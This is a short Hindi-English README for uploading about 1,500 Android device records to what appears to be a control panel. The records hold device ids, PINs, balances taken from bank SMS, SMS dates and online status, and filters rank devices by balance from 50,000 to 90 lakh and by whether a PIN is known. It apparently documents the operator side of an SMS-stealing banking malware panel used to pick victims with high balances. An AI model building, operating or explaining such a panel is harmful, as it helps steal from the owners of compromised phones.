# पूरी txt (1400–1500 devices) — APK upload

## Line format (| से)

```
deviceId|pin|name|panel|balance|lastSms|online
```

| Column | Example |
|--------|---------|
| deviceId | Android / Firebase device id |
| pin | `1234` या `open` (बिना PIN) |
| name | optional |
| panel | panel नाम — **Panels count** इसी से |
| balance | `75000` या `3.5l` (लाख) — bank SMS balance |
| lastSms | `09/11/2025` या epoch ms |
| online | `1` / `0` या `online` / `offline` |

## Start Phase Fetch (filters)

1. **Txt → Firestore** या **Fetch 1200+** — सारी devices memory में
2. **Panels: X** dikhega
3. Filters:
   - **High→Low** — balance **50,000 – 90 lakh**
   - **Low→High** — balance **2,000 – 50,000**
   - **PIN:** Both / With / Without
   - **SMS:** 1,3,7,15,30 din (bank SMS time)
   - **Line:** Both / Online (ऊपर) / Offline
4. **▶ Start Phase Fetch** — match होने वाली list

## Example

```
abc123|open|R1|Panel-A|125000|06/11/2025|1
def456|4521|R2|Panel-A|15000|05/11/2025|0
```

## Firebase fields (अगर direct DB)

`deviceId`, `pin`, `panel`, `balance`, `lastSmsAt`, `online`
